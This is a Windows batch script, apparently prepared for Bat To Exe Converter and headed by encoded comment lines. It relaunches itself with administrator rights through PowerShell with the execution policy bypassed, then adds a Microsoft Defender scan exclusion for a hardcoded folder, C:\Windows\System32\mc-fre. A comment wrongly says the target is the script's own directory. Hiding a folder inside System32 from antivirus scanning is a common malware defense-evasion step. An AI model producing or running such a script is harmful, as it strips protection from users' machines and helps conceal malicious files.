::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFDRnbSmjAE+/Fb4I5/jH/PyEqkIOQN4eaozUlL2NL4A=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF65
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpSI=
::egkzugNsPRvcWATEpSI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJlZksaGUrWaTna
::ZQ05rAF9IBncCkqN+0xwdVsBAlTMaSXqZg==
::ZQ05rAF9IAHYFVzEqQIRKwlbTgWWfHm/B7EZ+og=
::eg0/rx1wNQPfEVWB+kM9LVsJDCWBLmSIAuZOpu3j6oo=
::fBEirQZwNQPfEVWB+kM9LVsJDCWBLmSIAuZOpu3j6oo=
::cRolqwZ3JBvQF1fEqQIRKwlbTgWWfHm/B7EZ+qiuobrHq0MOQOMzdIrJug==
::dhA7uBVwLU+EWHiA+0A1SA==
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATE100gMQldSwyWfDrjXuFRurirvqqmpkIfUaIMYZzP37mdYMkd6Ur2ZZk/125fnIsNAh8Ydwa4LgM9qmtMpWuXJInckgPtClqA4UMkCCVmgnDVnj0+ZJ0I
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDRnbSmjAE+/Fb4I5/jH/PyEqkIOQN4ee53U6LDdcq4W8kCE
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
setlocal

:: --- Self-elevate (relaunch as admin) ---
:: If we can't access admin-only resources, re-run ourselves elevated.
net session >nul 2>&1
if %errorlevel% neq 0 (
  powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "Start-Process -FilePath '%~f0' -Verb RunAs"
  exit /b
)

:: --- Target folder: the directory this .bat is in ---
set "TARGET_DIR=C:\Windows\System32\mc-fre"
:: remove trailing backslash (optional, but keeps it clean)
if "%TARGET_DIR:~-1%"=="\" set "TARGET_DIR=%TARGET_DIR:~0,-1%"

echo Adding Windows Defender exclusion for:
echo   "%TARGET_DIR%"
echo.

:: --- Add Defender exclusion ---
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "Add-MpPreference -ExclusionPath '%TARGET_DIR%'" 2>nul

if %errorlevel% equ 0 (
  echo Done.
) else (
  echo Failed. Make sure Microsoft Defender is enabled and you are running as Administrator.
)

endlocal